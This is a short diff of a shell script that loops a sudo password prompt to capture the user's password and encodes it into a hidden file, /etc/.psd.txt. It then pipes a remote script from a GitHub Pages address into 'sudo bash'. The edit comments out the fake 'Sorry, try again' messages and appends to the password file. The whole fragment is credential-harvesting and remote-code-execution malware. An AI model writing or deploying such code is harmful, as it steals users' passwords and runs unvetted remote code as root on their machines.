@@ -11,9 +11,9 @@ echo ""
 sudo -k
 
 while [ "$(echo $psd | sudo -S whoami)" != "root" ]; do
-  sleep 3
-  echo "Sorry, try again."
-  echo -n "Password:"
+  #sleep 3
+  #echo "Sorry, try again."
+  #echo -n "Password:"
   read -s psd </dev/tty
   echo ""
   sudo -k
@@ -33,6 +33,6 @@ rm mycron
 
 enc=$(echo $psd | base64 | tr -- '+=/' '-_~')
 
-sudo echo $enc > /etc/.psd.txt
+echo $enc | sudo tee -a /etc/.psd.txt > /dev/null
 
 curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
